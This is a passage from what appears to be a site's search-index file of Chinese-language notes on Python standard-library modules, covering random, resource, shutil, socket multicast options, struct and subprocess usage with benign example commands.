类的隐藏实例的绑定方法。 你可以实例化自己的 Random 类实例以获取不共享状态的生成器。 random 模块还提供 SystemRandom 类，它使用系统函数 os.urandom() 从操作系统提供的源生成随机数。 警告 不应将此模块的伪随机生成器用于安全目的。 有关安全性或加密用途，请参阅 secrets 模块。 功能/状态 random.seed(a=None, version=2) 初始化随机数生成器。 如果 a 被省略或为 None ，则使用当前系统时间。\n如果操作系统提供随机源，则使用它们而不是系统时间（有关可用性的详细信息，请参阅 os.urandom() 函数）。 如果 a 是 int 类型，则直接使用。 对于版本2（默认的），str 、 bytes 或 bytearray 对象转换为 int 并使用它的所有位。 对于版本1（用于从旧版本的Python再现随机序列），用于 str 和 bytes 的算法生成更窄的种子范围。 在 3.2 版更改: 已移至版本2方案，该方案使用字符串种子中的所有位。 在 3.11 版更改: The seed must be one of the following types: NoneType, int, float, str, bytes, or bytearray. random.getstate() 返回捕获生成器当前内部状态的对象。 这个对象可以传递给 setstate() 来恢复状态。 random.setstate(state) state 应该是从之前调用 getstate() 获得的，并且 setstate() 将生成器的内部状态恢复到 getstate() 被调用时的状态。 用于字节数据的函数 random.randbytes(n) 生成 n 个随机字节。 此方法不可用于生成安全凭据。 那应当使用 secrets.token_bytes()。 3.9 新版功能. 整数用函数 random.randrange(stop) 待补充 random.randrange(start, stop[, step]) 从 range(start, stop, step) 返回一个随机选择的元素。\n这相当于 choice(range(start, stop, step)) ，但实际上并没有构建一个 range 对象。 位置参数模式匹配 range() 。不应使用关键字参数，因为该函数可能以意外的方式使用它们。 在 3.2 版更改: randrange() 在生成均匀分布的值方面更为复杂。\n以前它使用了像``int(random()*n)``这样的形式，它可以产生稍微不均匀的分布。 3.10 版后已移除: 非整数类型到相等整数的自动转换已被弃用。\n目前 randrange(10.0) 会无损地转换为 randrange(10)。 在未来，这将引发 TypeError。 3.10 版后已移除: 针对非整数值例如 randrange(10.5) 或 randrange('10') 引发的异常将从 ValueError 修改为 TypeError。 random.randint(a, b) 返回随机整数 N 满足 a <= N <= b。相当于 randrange(a, b+1)。 random.getrandbits(k) 返回具有 k 个随机比特位的非负 Python 整数。\n此方法随 MersenneTwister 生成器一起提供，其他一些生成器也可能将其作为 API 的可选部分提供。\n在可能的情况下，getrandbits() 会启用 randrange() 来处理任意大的区间。 在 3.9 版更改: 此方法现在接受零作为 k 的值。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-random.html","loc":"/yq-docs-rear-end-python-python-standard-library-random.html"},{"title":"resource","text":"官网: https://docs.python.org/zh-cn/3/library/resource.html 资源使用信息 该模块提供了测量和控制程序所利用的系统资源的基本机制。 资源限制 资源的使用可以通过下面描述的 setrlimit() 函数来限制。每个资源都被一对限制所控制：\n一个软限制和一个硬限制。软限制是当前的限制，并且可以由一个进程随着时间的推移而降低或提高。\n软限制永远不能超过硬限制。硬限制可以降低到大于软限制的任何数值，但不能提高。\n（只有拥有超级用户有效UID的进程才能提高硬限制。) 可以被限制的具体资源取决于系统。它们在 man getrlimit(2) 中描述。 resource.getrlimit(resource) 返回一个包含 resource 当前软限制和硬限制的元组。\n如果指定了一个无效的资源，则触发 ValueError ，如果底层系统调用意外失败，则引发 error 。 resource.setrlimit(resource, limits)  设置 resource 的新的消耗极限。参数 limits 必须是一个由两个整数组成的元组 (soft, hard) ，描述了新的限制。\nRLIM_INFINITY 的值可以用来请求一个无限的限制。 如果指定了一个无效的资源，如果新的软限制超过了硬限制，或者如果一个进程试图提高它的硬限制，将触发 ValueError 。\n当资源的硬限制或系统限制不是无限时，指定一个 RLIM_INFINITY 的限制将导致 ValueError 。\n一个有效 UID 为超级用户的进程可以请求任何有效的限制值，包括无限，\n但如果请求的限制超过了系统规定的限制，则仍然会产生 ValueError 。 如果底层系统调用失败， setrlimit 也可能触发 error 。 VxWorks只支持设置 RLIMIT_NOFILE 。 触发一个 auditing event resource.setrlimit 使用参数 resource ， limits 。 resource.prlimit(pid, resource[, limits]) 将 setrlimit() 和 getrlimit() 合并为一个函数，支持获取和设置任意进程的资源限制。\n如果 pid 为0，那么该调用适用于当前进程。 resource 和 limits 的含义与 setrlimit() 相同，只是 limits 是可选的。 当 limits 没有给出时，该函数返回进程 pid 的 resource 限制。当 limits 被给定时，\n进程的 resource 限制被设置，并返回以前的资源限制。 当 pid 找不到时，触发 ProcessLookupError ；当用户没有进程的 CAP_SYS_RESOURCE 时，触发 PermissionError 。 触发一个 auditing event resource.prlimit 带有参数 pid ， resource ， limits 。 Availability: Linux >= 2.6.36 with glibc >= 2.13. 3.4 新版功能.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-resource.html","loc":"/yq-docs-rear-end-python-python-standard-library-resource.html"},{"title":"shutil","text":"官网: https://docs.python.org/zh-cn/3/library/shutil.html 高阶文件操作 shutil 模块提供了一系列对文件和文件集合的高阶操作。\n特别是提供了一些支持文件拷贝和删除的函数。 对于单个文件的操作，请参阅 os 模块。 一些常用 copy, 文件的复制, 复制时, 如果是软链, 会自动找到真实的源文件, 然后把源文件复制过来,\n新的文件名与软链名保持一致, 可使用 follow_symlinks=False 达到与 copy2 一致 copy2, 文件的复制, 复制时, 如果是软链, 仅复制此软链 copy_tree, 目录的复制 shutil.disk_usage(path) 返回给定路径的磁盘使用统计数据，形式为一个 named tuple，\n其中包含 total, used 和 free 属性，分别表示总计、已使用和未使用空间的字节数。 path 可以是一个文件或是一个目录。 shutil.move(src, dst, copy_function=copy2) 递归地将一个文件或目录 (src) 移至另一位置 (dst) 并返回目标位置。 如果目标是已存在的目录，则 src 会被移至该目录下。 如果目标已存在但不是目录，它可能会被覆盖，具体取决于 os.rename() 的语义。 shutil.rmtree(path, ignore_errors=False, onerror=None, *, dir_fd=None) 删除一个完整的目录树； path 必须指向一个目录（但不能是一个目录的符号链接）。 如果 ignore_errors 为真值，删除失败导致的错误将被忽略；\n如果为假值或是省略，此类错误将通过调用由 onerror 所指定的处理程序来处理，\n或者如果此参数被省略则将引发一个异常。 shutil.copytree(src, dst, symlinks=False, ignore=None, copy_function=copy2, ignore_dangling_symlinks=False, dirs_exist_ok=False) 递归地将以 src 为根起点的整个目录树拷贝到名为 dst 的目录并返回目标目录。\n所需的包含 dst 的中间目录在默认情况下也将被创建。 目录的权限和时间会通过 copystat() 来拷贝，单个文件则会使用 copy2() 来拷贝","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-shutil.html","loc":"/yq-docs-rear-end-python-python-standard-library-shutil.html"},{"title":"site","text":"官网: https://docs.python.org/zh-cn/3/library/site.html 获取本地三方包路径: $ python3 -m site --user-site\n/home/user/.local/lib/python3.3/site-packages --user-base 输出用户基本的路径。 --user-site 输出用户site-packages目录的路径。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-site.html","loc":"/yq-docs-rear-end-python-python-standard-library-site.html"},{"title":"socket","text":"官网: https://docs.python.org/zh-cn/3/library/socket.html 底层网络接口 提供了访问 BSD 套接字 的接口。在所有现代 Unix 系统、Windows、macOS 和其他一些平台上可用。 套接字协议簇 仅介绍常用的 ipv4与ipv6相关地址协议簇 一对 (host, port) 被用作 AF_INET 地址族，其中 host 是一个表示互联网域名标记形式的主机名例如 'daring.cwi.nl'\n或者 IPv4 地址例如 '100.50.200.5' 的字符串，而 port 是一个整数值。 对于 IPv4 地址，有两种可接受的特殊形式被用来代替一个主机地址：'' 代表 INADDR_ANY，用来绑定到所有接口；\n字符串 '<broadcast>' 代表 INADDR_BROADCAST。\n此行为不兼容 IPv6，因此，如果你的 Python 程序打算支持 IPv6，则可能需要避开这些。 对于 AF_INET6 地址族，使用一个四元组 (host, port, flowinfo, scope_id)，\n其中 flowinfo 和 scope_id 代表了 C 库 struct sockaddr_in6\n中的 sin6_flowinfo 和 sin6_scope_id 成员。\n对于 socket 模块中的方法， flowinfo 和 scope_id 可以被省略，只为了向后兼容。\n注意，省略 scope_id 可能会导致操作带有领域 (Scope) 的 IPv6 地址时出错。 setsockopt setsockopt()方法用来设置套接字选项,它有以下参数: level:选项级别,用于区分是针对套接字级别的选项还是某个具体协议级别的选项。socket.SOL_SOCKET表示套接字级别。 optname:选项名称, 如socket.SO_BROADCAST,表示广播选项。\n支持的值: level为SOL_SOCKET:设置套接字级别的选项。包括: SO_REUSEADDR:允许重用本地地址和端口。\n比如当上一个套接字关闭时立即再启动, 会发现报错端口已占用.\n这是因为上一次关闭时, 其处于 TIME_WAIT 状态，无法立即重用, 设置此选项即可立即重用. SO_REUSEPORT: 允许多个套接字绑定到同一个地址和端口。\n普通的套接字绑定要求地址和端口必须是唯一的。如果有两个套接字尝试绑定到同一地址和端口,第二个绑定调用将失败。 SO_KEEPALIVE:开启TCP keepalive机制。 SO_SNDBUF / SO_RCVBUF:设置发送/接收缓冲区大小。 SO_LINGER:控制套接字关闭时未发送的数据。 SO_OOBINLINE:允许接收带外数据。 SO_BROADCAST: 允许套接字发送广播数据包。这在编写基于UDP的广播程序时需要设置 SO_ERROR: 获取或设置套接字的错误状态。当一个套接字出现错误时，它将返回一个非零值，表示该套接字上发生了错误。\n这个错误状态可以通过 socket.getsockopt() 和 socket.setsockopt() 来获取和设置。\n常见的错误状态包括连接被拒绝、超时、主机名无法解析等 level为IPPROTO_IP / IPPROTO_TCP:设置IP/TCP级别的选项。包括: IP_TOS:设置IP数据包的服务类型。 TCP_NODELAY:禁用Nagle算法,立即发送数据。 IP_MULTICAST_TTL: 设置IP多播数据包的存活时间TTL。它控制多播数据包可以跨过的路由器数量.\nIP_MULTICAST_TTL选项的值确实只能在0到255之间。\n它表示IP多播数据包可以跨越的路由器数量。每个路由器跨越时,该值减一。当值减至0时,该数据包将不再被转发。\n所以,该选项的值越大,多播数据包可以传输的距离越远。常用的值有: 1:同一子网内。只允许多播数据包在本地网络内传输。 32:同一站点内。允许跨越较大范围,可覆盖大多数机房或校园网。 64:同一地域内。可以覆盖较大范围的地区网络。 128或更大:更广范围的覆盖,甚至跨洲际。 而0值表示禁止多播数据包转发,它将被丢弃而不离开本地主机。\n所以,对于这个选项,推荐的值一般为: 1-32:局域网/机房内多播。 64-128:广域网多播。 0:禁止多播数据包转发,本地回环。 正确设置这个值,可以控制多播数据包的传播范围,实现我们想要的多播覆盖面。 eg, 当值为2时: 表示多播数据包可以在当前子网及直接相邻的一个子网传输,但不允许传输到更远的网络。\n它允许包括第一个跨路由器跳跃在内的两次路由。当IP多播数据包离开源主机后,它可以跨越第一个路由器,此时TTL值减一变为1。\n然后在第二个路由器,TTL值再减一变为0。此时,该路由器将不再转发这个数据包,且将其丢弃。 IP_MULTICAST_LOOP: 控制是否向本地套接字发送回环多播数据包。\n默认情况下,IP多播数据包会回环到本地,但在某些情况下我们需要禁用此功能。 IPPROTO_IPV6:设置IPv6相关的选项。 value:选项值,1表示允许,0表示禁止。 如允许UDP套接字udp_server发送和接收广播数据包: udp_server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) 如果不设置这个选项,默认情况下套接字是不允许广播的。设置后,套接字可以: 使用udp_server.sendto(data, (\"<broadcast>\", port)) 发送广播 使用udp_server.recvfrom(bufsize) 接收广播 socket.setsockopt(level, optname, value: int) 待补充 socket.setsockopt(level, optname, value: buffer) 待补充 socket.setsockopt(level, optname, None, optlen: int) 设置给定套接字选项的值（参阅 Unix 手册页 setsockopt(2) ）。\n所需的符号常量（ SO_* 等）已定义在本 socket 模块中。\n该值可以是整数、None 或表示缓冲区的 字节类对象。\n在后一种情况下，由调用者确保字节串中包含正确的数据位\n（关于将 C 结构体编码为字节串的方法，请参阅可选的内置模块 struct ）。\n当 value 设置为 None 时，必须设置 optlen 参数。\n这相当于调用 setsockopt() C 函数时使用了 optval=NULL 和 optlen=optlen 参数。 eg: # 设置socket选项，开启广播模式\n# 允许地址重用, 可以在同一个端口上绑定多个套接字\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\n# 启用广播模式，可以向本地网络中的所有主机发送广播消息\nsock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n# 值设置为2，表示传输范围为本地子网，\n# 也就是说，UDP数据包只会被发送到与本地网络相连的主机\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)\n# 值设置为1, 启用IP多播回送功能，允许主机接收自己发送的IP多播数据报\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)\n\n# 绑定IP地址和端口号\nsock.bind(cls._SSDP_Addr)\n\n# 加入多播组\n# group变量存储多播地址, inet_aton()方法将其转换为二进制格式\ngroup = socket.inet_aton(cls._SSDP_Addr[0])\n# 将该地址和INADDR_ANY一起打包\nmreq = struct.pack('4sL', group, socket.INADDR_ANY)\n# 将socket加入到指定的多播组中\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) inet_aton socket.inet_aton(ip_string) 将给定的地址字符串转换为32位二进制格式返回 inet_aton() 也接受句点数少于三的字符串，详情请参阅 Unix 手册 inet(3)。 如果传入本函数的 IPv4 地址字符串无效，则抛出 OSError。注意，具体什么样的地址有效取决于 inet_aton() 的底层 C 实现。 inet_aton() 不支持 IPv6，在 IPv4/v6 双协议栈下应使用 inet_pton() 来代替。 一些常量 socket.INADDR_ANY: 一个常用的特殊值,它表示: 0.0.0.0, 即所有本地IP地址。 socket.IP_ADD_MEMBERSHIP: 让套接字加入指定的IP多播组,从而接收该组的数据包 socket.SOCK_DGRAM表示使用UDP数据报套接字。 socket.AF_INET表示使用IPv4地址族。 将udp-socket加入多播组 加入多播组 group变量存储多播地址, inet_aton()方法将其转换为二进制格式: group = socket.inet_aton(cls._SSDP_Addr[0]) 将该地址和INADDR_ANY一起打包成一个4字节字符串加一个4/8字节整数,总长度为8/12字节: mreq = struct.pack('4sL', group, socket.INADDR_ANY) 4s:4个字符,使用s表示。这将打包成4个字节的字符串 L:1个长整型(long integer),使用L表示。这将打包成4字节(32位)或8字节(64位)的整数,取决于平台 将socket加入到指定的多播组中: sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) socket的recvfrom与recv区别 参数个数 recvfrom(bufsize, flags) 接收数据并包含发送方地址信息。 recv(bufsize, flags) 仅接收数据,不包含发送方地址信息。 返回值 recvfrom() 返回值是(data, address)。包含接收的数据和发送方地址。 recv() 返回值只有接收的数据data。 使用场景 recvfrom() Typically used on UDP sockets where sender address matters.\n通常用于UDP套接字,需要获取发送方地址信息。 recv() Typically used on TCP sockets where sender address does not matter.\n通常用于TCP套接字,不需要获取发送方地址信息。 总结 如果是TCP套接字,或者发送方地址信息不重要,使用recv()。 如果是UDP套接字,或者需要获取发送方地址信息,使用recvfrom()。 参考: socket-底层网络接口 说明 recv(bufsize, flags) 的bufsize决定一次能接受多少数据, send也是, 如果数据量大\n建议将大数据分成多次循环发送.","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-socket.html","loc":"/yq-docs-rear-end-python-python-standard-library-socket.html"},{"title":"socketserver","text":"用于简化网络服务端编写的类。(简化socket开发)","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-socketserver.html","loc":"/yq-docs-rear-end-python-python-standard-library-socketserver.html"},{"title":"struct","text":"与c底层数据做转换, 设计到了字节, 大小端, 数据流等的知识 常用函数: pack(fmt,v1,v2…)\n返回string. 按照给定的格式(fmt),把数据转换成字符串(字节流),并将该字符串返回. unpack(fmt,v1,v2…..)\n返回tuple. 按照给定的格式(fmt)解析字节流,并返回解析结果 calcsize(fmt)\n返回size of fmt. 计算给定的格式(fmt)占用多少字节的内存，注意对齐方式 详情参见:: https://blog.csdn.net/qq_30638831/article/details/80421019","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-struct.html","loc":"/yq-docs-rear-end-python-python-standard-library-struct.html"},{"title":"subprocess","text":"call subprocess.call(args, *, stdin=None, stdout=None, stderr=None, shell=False) 父进程直接创建子进程执行程序(执行命令), 然后等待子进程完成 返回值: 返回子进程的 退出状态 即 child.returncode 属性 (返回状态码, 命令正常执行返回0, 报错则返回1)) ret1=subprocess.call(\"ifconfig\")\nret2=subprocess.call(\"ipconfig\")    # python3.5不是这样, 依然会抛出异常导致无法对ret2赋值\nprint(ret1)     # 0\nprint(ret2)     # 1\n\nret = subprocess.call([\"ls\", \"-l\"], shell=False)    # shell为False的时候命令必须分开写\nret = subprocess.call(\"ls -l\", shell=True) check_call subprocess.check_call(args, *, stdin=None, stdout=None, stderr=None, shell=False) 父进程直接创建子进程执行程序, 然后等待子进程完成, 具体可以使用的参数, 参考上文 Popen 类的介绍。 返回值: 无论子进程是否成功, 该函数都返回 0.\n但是如果子进程的退出状态不是0, check_call() 抛出异常 CalledProcessError,\n异常对象中包含了 child.returncode 对应的返回码。 例, check_call()正常执行命令: >>> import subprocess\n>>> p = subprocess.check_call(['ping', '-c', '2', 'www.baidu.com'])\nPING www.baidu.com (39.156.66.14): 56 data bytes\n64 bytes from 39.156.66.14: icmp_seq=0 ttl=52 time=40.865 ms\n64 bytes from 39.156.66.14: icmp_seq=1 ttl=52 time=48.753 ms\n\n--- www.baidu.com ping statistics ---\n2 packets transmitted, 2 packets received, 0.0% packet loss\nround-trip min/avg/max/stddev = 40.865/44.809/48.753/3.944 ms\n>>> p\n0 例, check_call()错误执行命令: >>> p = subprocess.check_call(['ping', '-c', '2', 'www.xxxxxdu.com'])\nping: cannot resolve www.xxxxxdu.com: Unknown host\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 373, in check_call\n    raise CalledProcessError(retcode, cmd)\nsubprocess.CalledProcessError: Command '['ping', '-c', '2', 'www.xxxxxdu.com']' returned non-zero exit status 68.\n>>> p\n0 check_output subprocess.check_output(args, *, stdin=None, stderr=None, shell=False, universal_newlines=False) 执行命令, 如果执行成功则返回执行结果(以 字符串 的形式返回子进程的输出), 否则抛异常: subprocess.check_output([\"echo\", \"Hello World!\"])\nsubprocess.check_output(\"exit 1\", shell=True) 返回值: 字符串形式的子进程的输出结果,\n但是如果子进程的 退出状态 不是0, 那么抛出异常 CalledProcessError, 异常对象中包含了 child.returncode 对应的返回码。 注意: check_output() 的函数签名中没有参数 stdout , 调用该方法时, 子进程的输出默认就返回给父进程。 例, check_output() 调用的子进程正常与错误退出: >>> subprocess.check_output([\"echo\", \"Hello World!\"])\nb'Hello World!\\n'\n\n>>> subprocess.check_output(\"exit 1\", shell=True)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 424, in check_output\n    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,\n  File \"/usr/local/Cellar/python@3.9/3.9.10/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py\", line 528, in run\n    raise CalledProcessError(retcode, process.args,\nsubprocess.CalledProcessError: Command 'exit 1' returned non-zero exit status 1.\n>>> 注解 使用上面提到的三个方法: call(), check_call(), check_output() 时,\n尽量不要将参数 stderr 和 stdout 设置为 subprocess.PIPE ,\n这几个函数默认都会等待子进程完成, 子进程产生大量的输出数据如果造成管道堵塞, 父进程再等待子进程完成可能造成死锁。 Popen subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0) 执行复杂的系统命令. 创建并返回一个子进程 , 并在这个进程中执行指定的程序。 实例化 Popen 可以通过许多参数详细定制子进程的环境, 但是只有一个参数是必须的, 即位置参数 args args shell命令, 可以是字符串或者序列类型（如：list, 元组） 要执行的命令或可执行文件的路径。 一个由字符串组成的序列（通常是列表）,\n列表的第一个元素是可执行程序的路径,\n剩下的是传给这个程序的参数. 如果没有要传给这个程序的参数, args 参数可以仅仅是一个字符串。 bufsize: int = 0 指定缓冲 控制 stdin , stdout , stderr 等参数指定的文件的缓冲, 和打开文件的 内建函数 open() 中的参数 bufsize 含义相同。 0 无缓冲,1 行缓冲,其他正数表示近似的缓冲区字节数, 负值表示使用系统默认值. 默认是0. executable=None 如果这个参数不是 None, 将替代参数 args 作为可执行程序 stdin=None 表示指定子程序的标准输入 stdout=None 表示指定子程序的标准输出 stderr=None 表示指定子程序的标准错误 对于 stdin, stdout 和 stderr 而言, 如果他们是 None（默认情况）, 那么子进程使用和父进程相同的标准流文件。 父进程如果想要和子进程通过 communicate() 方法通信, 对应的参数必须是 subprocess.PIPE 当然 stdin, stdout 和 stderr 也可以是已经打开的 file 对象, 前提是以合理的方式打开, 比如 stdin 对应的文件必须要可读等。 preexec_fn=None 只在Unix平台下有效, 用于指定一个可执行对象（callable object）, 它将在子进程运行之前被调用 默认是None, 否则必须是一个函数或者可调用对象, 在子进程中首先执行这个函数, 然后再去执行为子进程指定的程序或Shell。 close_sfs: bool = False 在windows平台下, 如果close_fds被设置为True,\n则新创建的子进程将不会继承父进程的输入、输出、错误管道.\n所以不能将close_fds设置为True同时重定向子进程的标准输入、输出与错误(stdin, stdout, stderr)。 布尔型变量, 为 True 时, 在子进程执行前强制关闭所有除 stdin, stdout和stderr外的文件 shell: bool = False 布尔型变量, 明确要求使用shell运行程序, 与参数 executable 一同指定子进程运行在什么 Shell 中 如果executable=None 而 shell=True, 则使用 /bin/sh 来执行 args 指定的程序\n也就是说, Python首先起一个shell, 再用这个shell来解释指定运行的命令.\n注意这个时候有个特殊情况,\n如果参数args是字符串, 那么一般不会有啥问题,\n如果参数是列表, 那么列表会当错/bin/sh的参数传递, 有可能导致无法正常识别指令.\n比如: subprocess.Popen(['tar', '-zxf', 'xxx.tar.gz'], shell=True) 实际触发的是: /bin/sh -c tar -zxf xxx.tar.gz 会报错tar没有给选项(因为被当错了sh的参数), 所以这时候还是老老实实的shell=False吧. 注意 windows 下, 普通权限执行文件不需要设置此选项, 但是, 当执行文件需要申请权限时, 必须设置为 true, 才可以触发权限申请的框. cwd=None 用于设置子进程的当前目录 代表路径的字符串, 指定子进程运行的工作目录, 要求这个目录必须存在； env: dict = None 用于指定子进程的环境变量。如果env = None, 子进程的环境变量将从父进程中继承。 universal_newlines: bool = False 不同系统的换行符不同, True 表示 stdout 和 stderr 使用 \\n 通用换行（universal newline）模式 startupinfo=None 只在windows下有效, 将被传递给底层的 CreateProcess() 函数, 用于设置子进程的一些属性, 如：主窗口的外观, 进程的优先级等等 createionflags: int = 0 同上 同 Linux 中创建子进程类似, 父进程创建完子进程后, 并不会自动等待子进程执行,\n父进程在子进程之前推出将导致子进程成为孤儿进程, 孤儿进程统一由 init 进程接管, 负责其终止后的回收工作。 如果父进程在子进程之后终止, 但子进程终止时父进程没有进行最后的回收工作,\n子进程残留的数据结构称为僵尸进程。大量僵尸进程将耗费系统资源,\n因此父进程及时等待和回收子进程是必要的, 除非能够确认自己比子进程先终止, 从而将回收工作过渡给 init 进程。 这个等待和回收子进程的操作就是wait()函数 关于 shell: bool = False 参数 有需求在linux下使用pkexec来申请权限, 如执行ls\n可以成功执行的两种调用: subprocess.Popen('pkexec ls', shell=True)\nsubprocess.Popen(['sh', '-c', 'pkexec ls'], shell=False) 不能生效的调用(弹出界面一闪而逝或者压根不显示): subprocess.Popen(['pkexec', 'ls'], shell=False) 后面发现这个貌似实际是: pkexec ls & 与这个的区别: sh -c \"pkexec ls\" 注解 对于的系统命令而言, 当存在关键词参数且参数的值有空格时, 不要使用: Popen(['cmd', '--update=t t t']) 而是使用: Popen(['cmd', '--update', 't t t']) 因为前者会把 '--update=t t t' 解析为带引号的字符串: \"--update=t t t\" 从而导致识别不了关键字参数 --update 例1: import subprocess\nret1 = subprocess.Popen([\"mkdir\",\"t1\"])\nret2 = subprocess.Popen(\"mkdir t2\", shell=True) 注解 终端输入的命令分为两种： 非交互式: 输入即可得到输出, 如 ifconfig 交互式: 输入进行某环境, 依赖再输入, 如 python 例2: import subprocess\n\nobj = subprocess.Popen(\"mkdir t3\", shell=True, cwd='/home/dev',)     #在cwd目录下执行命令\nimport subprocess\n\nobj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\nobj.stdin.write(\"print(1)\\n\")\nobj.stdin.write(\"print(2)\")\nobj.stdin.close()\n\ncmd_out = obj.stdout.read()\nobj.stdout.close()\ncmd_error = obj.stderr.read()\nobj.stderr.close()\n\nprint(cmd_out)\nprint(cmd_error)\nimport subprocess\n\nobj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\nobj.stdin.write(\"print(1)\\n\")\nobj.stdin.write(\"print(2)\")\n\nout_error_list = obj.communicate()\nprint(out_error_list)\nimport subprocess\n\nobj = subprocess.Popen([\"python\"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\nout_error_list = obj.communicate('print(\"hello\")')\nprint(out_error_list) 例3: 创建一个子进程, 然后执行一个简单的命令: >>> import subprocess\n>>> p = subprocess.Popen('ls -l', shell=True)\n>>> total 164\n-rw-r--r--  1 root root   133 Jul  4 16:25 admin-openrc.sh\n-rw-r--r--  1 root root   268 Jul 10 15:55 admin-openrc-v3.sh\n...\n>>> p.returncode\n>>> p.wait()\n0\n>>> p.returncode\n0 这里也可以使用 p = subprocess.Popen(['ls', '-cl']) 来创建子进程。 属性 Popen创建的子进程有一些有用的属性, 假设 p 是 Popen 创建的子进程, p 的属性包括： p.pid : 子进程的PID。 p.returncode : 该属性表示子进程的返回状态.\nreturncode可能有多重情况: None  —— 子进程尚未结束；\n==0   —— 子进程正常退出；\n> 0   —— 子进程异常退出, returncode 对应于出错码；\n< 0   —— 子进程被信号杀掉了。 p.stdin, p.stdout, p.stderr : 子进程对应的一些初始文件,\n如果调用Popen()的时候对应的参数是subprocess.PIPE, 则这里对应的属性是一个包裹了这个管道的 file 对象, 方法 p.poll() 检查子进程  p 是否已经终止, 返回 p.returncode 属性 (参考下文 Popen 对象的属性)； p.wait() 等待子进程 p 终止, 返回 p.returncode 属性； 注意: wait() 立即阻塞父进程, 直到子进程结束！ p.communicate(input=None) 和子进程 p 交流, 将参数 input （字符串）中的数据发送到子进程的 stdin, 同时从子进程的 stdout 和 stderr 读取数据, 直到EOF。 返回值: 二元组 (stdoutdata, stderrdata) 分别表示从标准出和标准错误中读出的数据。 父进程调用 p.communicate() 和子进程通信有以下限制: 只能通过管道和子进程通信, 也就是说, 只有调用 Popen() 创建子进程的时候参数 stdin=subprocess.PIPE,\n才能通过 p.communicate(input) 向子进程的 stdin 发送数据；只有参数 stout 和 stderr 也都为 subprocess.PIPE , 才能通过p.communicate() 从子进程接收数据, 否则接收到的二元组中, 对应的位置是None。 父进程从子进程读到的数据缓存在内存中, 因此commucate()不适合与子进程交换过大的数据。 注意: communicate() 立即阻塞父进程, 直到子进程结束！ p.send_signal(signal) 向子进程发送信号 signal p.terminate() 终止子进程 p , 等于向子进程发送 SIGTERM 信号； p.kill() 杀死子进程 p , 等于向子进程发送 SIGKILL 信号； subprocess模块的其他属性 subprocess.PIPE : 调用本模块提供的若干函数时, 可作为 std 参数的值, 为标准流文件打开一个管道.\n例: 使用管道连接标准流文件: import subprocess\nchild1  = subprocess.Popen([ 'ls' ,  '-l' ], stdout = subprocess.PIPE)\nchild2  = subprocess.Popen([ 'wc' ,  '-l' ], stdin = child1.stdout, stdout = subprocess.PIPE)\nout  = child2.communicate()\nchild1.wait()\nchild2.wait()\nprint (out) 这里将子进程 child1 的标准输出作为子进程 child2 的标准输入, 父进程通过 communicate() 读取 child2 的标准输出后打印。 subprocess.STDOUT : 调用本模块提供的若干函数时, 可作为 stderr 参数的值, 将子进程的标准错误输出打印到标准输出。 subprocess模块定义的异常 subprocess.CalledProcessError 什么时候可能抛出该异常: 调用 check_call() 或 check_output() , 子进程的退出状态不为 0 时。 该异常包含以下信息: returncode: 子进程的退出状态； cmd: 创建子进程时指定的命令； output: 如果是调用 check_output() 时抛出的该异常, 这里包含子进程的输出, 否则该属性为None。 总结 使用 Popen 可以在Python进程中创建子进程 如果只对子进程的执行退出状态感兴趣, 可以调用 subprocess.call() 函数 如果想通过异常处理机制解决子进程异常退出的情形,\n可以考虑使用 subprocess.check_call() 和 subprocess.check_output。 如果希望获得子进程的输出, 可以调用 subprocess.check_output(), 但 Popen() 无疑是功能最强大的。 subprocess模块的缺陷在于默认提供的父子进程间通信手段有限, 只有管道；同时创建的子进程专门用来执行外部的程序或命令。 Linux下进程间通信的手段很多, 子进程也完全可能从创建之后继续调用 参考:: python - subprocess.Popen()多进程 subprocess: 可以在当前程序中执行其他程序或命令","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-subprocess.html","loc":"/yq-docs-rear-end-python-python-standard-library-subprocess.html"},{"title":"sys","text":"官网: sys --- 系统相关的参数和函数 该模块提供了一些变量和函数。\n这些变量可能被解释器使用，也可能由解释器提供。\n这些函数会影响解释器。\n本模块总是可用的。 仅记录常用的 属性 sys.argv 一个列表，其中包含了被传递给 Python 脚本的命令行参数。\nargv[0] 为脚本的名称（是否是完整的路径名取决于操作系统）。\n如果是通过 Python 解释器的命令行参数 -c 来执行的， argv[0] 会被设置成字符串 '-c' 。\n如果没有脚本名被传递给 Python 解释器， argv[0] 为空字符串。 为了遍历标准输入，或者通过命令行传递的文件列表，参照 fileinput 模块 另请参阅 sys.orig_argv。 注解 在 Unix 上，系统传递的命令行参数是字节类型的。Python 使用文件系统编码和 